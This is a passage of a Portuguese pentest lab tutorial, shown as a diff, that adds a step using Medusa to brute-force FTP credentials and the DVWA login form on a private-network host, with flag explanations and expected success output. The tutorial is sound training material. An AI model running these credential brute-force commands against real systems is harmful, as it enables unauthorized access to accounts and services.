@@ -83,4 +83,31 @@ Connected to 192.168.145.13. ← ESTABELECEU CONEXÃO ✅
 Name (192.168.145.13:Macbook): ← SOLICITOU USUÁRIO
 ```
 
-#### Hora do Brute Force! 💥🔥
+## 3º PASSO - Brute Force com Medusa: 💥🔥
+
+**Penetração no Sistema Operacional**:
+> $ medusa -h 192.168.145.13 -U **38650_Username.txt** -P 38650_Password.txt -M ftp -t 6  
+Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks ...
+
+**Pentest em Formulário Web**:
+
+> $ medusa -h 192.168.145.13 -U **38650_Username.txt** -P 38650_Password.txt -M http \
+-m PAGE:'dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login Failed' -t 6
+
+Onde:  
+> 192.168.145.13/dvwa/login.php  
+**Protocolo + Servidor(Apache ou Nginx) + Caminho do Arquivo**
+
+**-U** → Lista de Usuários  
+**-P** → Lista de Senhas  
+**-M** → Módulo  
+**-m** → Opções do Módulo  
+**-h** → Host (Alvo)
+
+**Exemplo de Retorno Esperado**:
+```
+WARNING: Invalid method ... ou
+2025-00-00 09:36:27 ACCOUNT FOUND .... [SUCCESS] ✅
+```
